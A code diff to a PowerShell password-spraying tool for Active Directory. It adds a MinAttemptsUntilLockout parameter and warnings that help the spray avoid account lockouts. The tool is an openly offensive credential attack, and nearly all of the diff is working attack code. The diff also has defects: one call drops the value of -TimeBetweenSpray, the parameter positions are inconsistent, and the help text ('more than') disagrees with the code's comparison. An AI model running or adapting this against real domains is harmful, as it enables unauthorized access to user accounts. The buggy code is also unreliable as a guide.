@@ -62,6 +62,10 @@ function Invoke-DomainPasswordSpray{
     
     Amount of time between sprays ( default: automatic )
 
+    .PARAMETER MinAttemptsUntilLockout
+
+    Limit password spraying to accounts with more than this number of attempts left until lockout. Default is 2 (if set to 1, a wrong attempt will lock the account!).
+
     .EXAMPLE
 
     C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
@@ -136,10 +140,13 @@ function Invoke-DomainPasswordSpray{
      $TimeBetweenSpray=0,
 
      [Parameter(Position = 12, Mandatory = $false)]
+     $MinAttemptsUntilLockout = 2,
+
+     [Parameter(Position = 13, Mandatory = $false)]
      [switch]
      $Quiet,
 
-     [Parameter(Position = 13, Mandatory = $false)]
+     [Parameter(Position = 14, Mandatory = $false)]
      [int]
      $Fudge=10
     )
@@ -190,7 +197,7 @@ function Invoke-DomainPasswordSpray{
 
     if ($UserList -eq "")
     {
-        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter -TimeBetweenSpray $TimeBetweenSpray
+        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter -TimeBetweenSpray  -MinAttemptsUntilLockout $MinAttemptsUntilLockout 
     }
     else
     {
@@ -228,7 +235,11 @@ function Invoke-DomainPasswordSpray{
     }
 
     Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
-    Write-Host "[*] Setting a $observation_window minute wait in between sprays."
+
+    if ($Passwords.count -gt 1) {
+        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
+        Write-Host "[*] Setting a $observation_window minute wait in between sprays."
+    }
 
     # if no force flag is set we will ask if the user is sure they want to spray
     if (!$Force)
@@ -340,6 +351,10 @@ function Get-DomainUserList
     
     Amount of time between sprays ( default: automatic )
 
+    .PARAMETER MinAttemptsUntilLockout
+
+    Limit password spraying to accounts with more than this number of attempts left until lockout. Default is 2 (if set to 1, a wrong attempt will lock the account!).
+
     .EXAMPLE
 
     PS C:\> Get-DomainUserList
@@ -374,10 +389,17 @@ function Get-DomainUserList
      [string]
      $Filter,
      
-     [Parameter(Position = 10, Mandatory = $false)]
+     [Parameter(Position = 5, Mandatory = $false)]
      [int]
-     $TimeBetweenSpray=0
+     $TimeBetweenSpray=0,
+
+     [Parameter(Position = 4, Mandatory = $false)]
+     $MinAttemptsUntilLockout = 2
     )
+
+    if($MinAttemptsUntilLockout -eq 1) {
+        Write-Host -ForegroundColor Red "[*] Warning! 'MinAttemptsUntilLockout' set to 1. This means the attack could target accounts which will be locked upon 1 bad attempt (the attempt you are about to perform)!"
+    }
 
     try
     {
@@ -525,7 +547,7 @@ function Get-DomainUserList
                 # if there is more than 1 attempt left before a user locks out
                 # or if the time since the last failed login is greater than the domain
                 # observation window add user to spray list
-                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
+                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -ge $MinAttemptsUntilLockout))
                                 {
                     $UserListArray.Add($samaccountname)
                 }
